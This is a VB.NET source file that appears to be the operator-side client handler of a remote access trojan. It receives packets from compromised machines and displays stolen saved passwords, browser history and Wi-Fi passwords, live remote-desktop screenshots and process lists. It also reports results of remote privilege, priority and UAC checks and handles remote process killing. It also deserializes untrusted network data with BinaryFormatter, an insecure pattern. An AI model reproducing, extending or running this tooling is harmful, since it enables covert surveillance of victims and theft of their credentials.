Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Threading
Imports PacketLib.Packet

Public Class Clients

    Implements IDisposable

    Private disposedValue As Boolean
    Public Property C As TcpClient
    Public Property ID As String
    Public Property Local_Port As Integer
    Public Property Main_Form As New Client_Form(Me)
    Public Property Viewer As New RD_Form(Me)

    Public Property Connected As Boolean

    Public WithEvents AeroLI_MainForm As AeroListView

    Sub New(ByRef LI As AeroListView)
        AeroLI_MainForm = LI
    End Sub

    Public Async Sub SetPW(ByVal Data As Object())

        Main_Form.Loading_PW.Visible = False
        Main_Form.Loading_PW.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Passwords_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data

                               Dim LI As New ListViewItem(H(0).ToString)
                               LI.SubItems.Add(H(1).ToString)
                               LI.SubItems.Add(H(2).ToString)
                               LI.SubItems.Add(H(3).ToString)

                               Main_Form.Passwords_ListView.Items.Add(LI)
                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)

    End Sub
    Public Async Sub SetHist(Data As Object())

        Main_Form.Loading_Hist.Visible = False
        Main_Form.Loading_Hist.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Hist_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data

                               Dim LI As New ListViewItem(H(0).ToString)
                               LI.SubItems.Add(H(1).ToString)
                               LI.SubItems.Add(H(2).ToString)
                               LI.SubItems.Add(H(3).ToString)

                               Main_Form.Hist_ListView.Items.Add(LI)
                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)

    End Sub
    Public Async Sub SetW_PW(Data As Object())

        Main_Form.Loading_W_PW.Visible = False
        Main_Form.Loading_W_PW.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.W_PW_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data


                               Try
                                   Dim LI As New ListViewItem(H(0).ToString)
                                   LI.SubItems.Add(H(1).ToString)

                                   Main_Form.W_PW_ListView.Items.Add(LI)
                               Catch ex As Exception

                               End Try

                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
    End Sub
    Public Async Sub Set_Tasks(Data As Object())

        Main_Form.Helper_Task_Label.Visible = False
        Main_Form.Loading_tasks.Visible = False
        Main_Form.Loading_tasks.Active = False
        Main_Form.RefreshToolStripMenuItem.Enabled = True

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Tasks_listview.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           Dim ImageList = New ImageList()
                           ImageList.ColorDepth = ColorDepth.Depth32Bit

                           ImageList.ImageSize = New Size(32, 32)
                           Main_Form.Tasks_listview.SmallImageList = ImageList

                           Dim x As Integer = 0

                           For Each H In Data

                               Dim listViewItem = Main_Form.Tasks_listview.Items.Add(H(0).ToString)

                               Try
                                   Dim B_Image As Byte() = CType(H(1), Byte())

                                   Dim B As Bitmap = BytesToImage(B_Image)

                                   ImageList.Images.Add(x, B)

                               Catch ex As Exception
                                   Dim B As Bitmap = My.Resources.imageres_15.ToBitmap
                                   ImageList.Images.Add(x, B)
                               End Try

                               listViewItem.ImageKey = x
                               x += 1

                           Next

                       End Sub)

        Main_Form.Tasks_listview.Sort()

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
    End Sub
    Public Sub Set_Delete_Proc(Data As Object())
        'Async
        '  Await Task.Run(Sub()
        '    If Data(2) = True Then
        '          For Each H As ListViewItem In Main_Form.Tasks_listview.Items
        '           If H.Text = Data(1).ToString Then
        '   H.Remove()
        '               Exit Sub
        '           End If

        '         Next
        '      End If
        '   End Sub)                

        If Data(2) = True Then
            For Each H As ListViewItem In Main_Form.Tasks_listview.Items
                If H.Text = Data(1).ToString Then
                    H.Remove()
                    Exit Sub
                End If

            Next
        End If


    End Sub
    Public Async Sub SetRD(Data As Object())
        Await Task.Run(Sub()
                           Viewer.PictureBox1.Image = BytesToImage(Data(0))
                           Viewer.LabeledDivider2.Text = Helpers.Numeric2Bytes(Data(0).Length)
                       End Sub)

    End Sub
    Public Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function

    Public Sub Sender(P As PacketLib.Packet.PacketMaker)
        Dim B As New BinaryFormatter
        Task.Run(Sub() B.Serialize(Me.C.GetStream, P))
    End Sub

    Public Sub SetPriv(ByVal N As Native.NtDll.NTSTATUS, ByVal P As Native.NtDll.Enumerations._PRIVILEGES)
        For Each Priv As ListViewItem In Main_Form.Priv_ListView.Items
            If Priv.Text = P.ToString() Then
                Priv.SubItems.Add(N.ToString())
                Exit For
            End If
        Next
    End Sub
    Public Sub Res(ByVal N As Native.NtDll.NTSTATUS)
        Main_Form.Label3.Text = N.ToString()
    End Sub
    Public Sub Res(ByVal P As Native.NtDll.Enumerations._PRIORITY_CLASS)
        Main_Form.Label2.Text = P.ToString()
    End Sub
    Public Sub Res(ByVal U As UInteger, ByVal Chk As Native.NtDll.Enumerations.RtlQueryElevation_Flags)
        Main_Form.Label4.Text = U

        If Chk = Native.NtDll.Enumerations.RtlQueryElevation_Flags.ALL_FLAGS Then
            Main_Form.Label5.Text = Native.NtDll.Enumerations.RtlQueryElevation_Flags.ELEVATION_INSTALLER_DETECTION_ENABLED.ToString
            Main_Form.Label6.Text = Native.NtDll.Enumerations.RtlQueryElevation_Flags.ELEVATION_UAC_ENABLED.ToString
            Main_Form.Label7.Text = Native.NtDll.Enumerations.RtlQueryElevation_Flags.ELEVATION_VIRTUALIZATION_ENABLED.ToString
        Else
            Main_Form.Label6.Text = ""
            Main_Form.Label5.Text = Chk.ToString
            Main_Form.Label7.Text = ""
        End If

    End Sub
    Public Async Sub Read(ByVal L As NetworkStream, ByVal Port As String, ByVal IMG As ImageList)

        Try

            While Connected

                Dim sf As BinaryFormatter = New BinaryFormatter()

                Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)

                Try


                    Select Case packet.Type_Packet

                        Case PacketType.ID
                            Await Task.Run(Sub() Countries.GetFlags(Me.C.Client.RemoteEndPoint.ToString, IMG, AeroLI_MainForm, packet.Misc, Port))
                          '  Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
                     '   GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, packet.Misc, Port)
                        Case PacketType.PW

                            Dim T As New Thread(Sub() SetPW(packet.Misc))
                            T.Start()

                        Case PacketType.HIST

                            Dim T As New Thread(Sub() SetHist(packet.Misc))

                            T.Start()

                        Case PacketType.W_PW

                            Dim T As New Thread(Sub() SetW_PW(packet.Misc))

                            T.Start()

                        Case PacketType.TASKS

                            Dim Subject As Packet_Subject = CType(packet.Misc(0), Packet_Subject)

                            Select Case Subject

                                Case Packet_Subject.RETRIEVE_TASKS

                                    Dim T As New Thread(Sub() Set_Tasks(packet.Misc(1)))

                                    T.Start()

                                Case Packet_Subject.KILL_TASK

                                    Dim T As New Thread(Sub() Set_Delete_Proc(packet.Misc))

                                    T.Start()

                            End Select

                        Case PacketType.RD

                            ThreadPool.QueueUserWorkItem(Sub() SetRD(packet.Misc))


                        Case PacketType.ERROR_LOAD_NATIVE_DLL

                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))

                            T.Start()

                        Case PacketType.SUCCESS_LOAD_NATIVE_DLL

                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))

                            T.Start()

                        Case PacketType.PLUGIN_CS_RES

                            Dim Packet_Sub As Packet_Subject = CType(packet.Misc(0), Packet_Subject)

                            Select Case Packet_Sub

                                Case Packet_Subject.GET_PRIV

                                    Dim Res As Native.NtDll.NTSTATUS = CType(packet.Misc(1), Native.NtDll.NTSTATUS)

                                    Dim Priv As Native.NtDll.Enumerations._PRIVILEGES = CType(packet.Misc(2), Native.NtDll.Enumerations._PRIVILEGES)

                                    Dim T As New Thread(Sub() SetPriv(Res, Priv))

                                    T.Start()

                                Case Packet_Subject.SET_PRIO

                                    Dim ResN As Native.NtDll.NTSTATUS = CType(packet.Misc(1), Native.NtDll.NTSTATUS)

                                    Dim T As New Thread(Sub() Res(ResN))

                                    T.Start()

                                Case Packet_Subject.GET_PRIO

                                    Dim ResN As Native.NtDll.Enumerations._PRIORITY_CLASS = CType(packet.Misc(1), Native.NtDll.Enumerations._PRIORITY_CLASS)

                                    Dim T As New Thread(Sub() Res(ResN))

                                    T.Start()

                                Case Packet_Subject.CHECK_UAC


                                    Dim ResN As Native.NtDll.Enumerations.RtlQueryElevation_Flags = CType(packet.Misc(1), Native.NtDll.Enumerations.RtlQueryElevation_Flags)

                                    Dim Uint As UInteger = CType(packet.Misc(2), UInteger)

                                    Dim T As New Thread(Sub() Res(Uint, ResN))

                                    T.Start()

                            End Select

                    End Select

                Catch ex As Exception

                End Try

            End While

        Catch ex As Exception

        End Try

    End Sub






    Protected Overrides Sub Finalize()
        Dispose()
    End Sub
    Protected Overridable Sub Dispose(disposing As Boolean)
        If Not disposedValue Then
            If disposing Then
                ' TODO: supprimer l'état managé (objets managés)
            End If

            ' TODO: libérer les ressources non managées (objets non managés) et substituer le finaliseur
            ' TODO: affecter aux grands champs une valeur null
            disposedValue = True
        End If
    End Sub

    ' ' TODO: substituer le finaliseur uniquement si 'Dispose(disposing As Boolean)' a du code pour libérer les ressources non managées
    ' Protected Overrides Sub Finalize()
    '     ' Ne changez pas ce code. Placez le code de nettoyage dans la méthode 'Dispose(disposing As Boolean)'
    '     Dispose(disposing:=False)
    '     MyBase.Finalize()
    ' End Sub

    Public Sub Dispose() Implements IDisposable.Dispose
        ' Ne changez pas ce code. Placez le code de nettoyage dans la méthode 'Dispose(disposing As Boolean)'
        Dispose(disposing:=True)
        GC.SuppressFinalize(Me)
    End Sub
End Class
